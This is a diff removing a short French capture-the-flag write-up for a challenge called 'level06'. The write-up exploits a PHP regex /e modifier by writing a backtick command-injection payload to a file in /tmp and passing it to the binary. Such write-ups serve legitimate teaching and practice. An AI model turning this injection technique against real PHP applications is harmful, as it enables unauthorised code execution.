@@ -1,8 +1,0 @@
-On execute le binaire level06 et on voit qu'il atend un fichier en parametres pour etre lu par file_get_contens
-
-On analyse la regex et on voit une faille possible avec le modificateur /e qui execute du code.
-
-echo '[x .${`getflag`}]' > /tmp/get
-
-./level06 /tmp/get
-
